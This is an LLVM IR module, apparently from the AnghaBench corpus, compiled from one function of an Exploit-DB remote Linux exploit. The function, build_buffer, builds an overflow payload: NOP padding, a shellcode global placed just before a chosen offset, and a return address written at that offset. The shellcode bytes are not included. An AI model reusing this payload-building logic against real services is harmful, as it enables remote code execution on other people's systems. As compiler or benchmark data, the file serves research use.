; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20569.c_build_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20569.c_build_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@NOP = common dso_local global i8 0, align 1
@OFFSET = common dso_local global i32 0, align 4
@shellcode = common dso_local global i64* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @build_buffer(i8* %0, i64* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i64*, align 8
  store i8* %0, i8** %3, align 8
  store i64* %1, i64** %4, align 8
  %5 = load i8*, i8** %3, align 8
  %6 = call i32 @memset(i8* %5, i8 signext 8, i32 1024)
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @memset(i8* %7, i8 signext 0, i32 7)
  %9 = load i8*, i8** %3, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 4
  store i8 4, i8* %10, align 1
  %11 = load i8*, i8** %3, align 8
  %12 = getelementptr inbounds i8, i8* %11, i64 8
  store i8 -2, i8* %12, align 1
  %13 = load i8*, i8** %3, align 8
  %14 = getelementptr inbounds i8, i8* %13, i64 9
  %15 = load i8, i8* @NOP, align 1
  %16 = load i8*, i8** %3, align 8
  %17 = call i32 @strtoul(i8* %16, i32* null, i32 10)
  %18 = load i32, i32* @OFFSET, align 4
  %19 = add nsw i32 %17, %18
  %20 = load i64*, i64** @shellcode, align 8
  %21 = call i32 @strlen(i64* %20)
  %22 = sub nsw i32 %19, %21
  %23 = sub nsw i32 %22, 9
  %24 = call i32 @memset(i8* %14, i8 signext %15, i32 %23)
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* @OFFSET, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i64*, i64** @shellcode, align 8
  %30 = call i32 @strlen(i64* %29)
  %31 = sext i32 %30 to i64
  %32 = sub i64 0, %31
  %33 = getelementptr inbounds i8, i8* %28, i64 %32
  %34 = load i64*, i64** @shellcode, align 8
  %35 = load i64*, i64** @shellcode, align 8
  %36 = call i32 @strlen(i64* %35)
  %37 = call i32 @memcpy(i8* %33, i64* %34, i32 %36)
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* @OFFSET, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i64*, i64** %4, align 8
  %43 = call i32 @memcpy(i8* %41, i64* %42, i32 4)
  %44 = load i8*, i8** %3, align 8
  %45 = getelementptr inbounds i8, i8* %44, i64 1023
  store i8 0, i8* %45, align 1
  ret void
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @strlen(i64*) #1

declare dso_local i32 @memcpy(i8*, i64*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
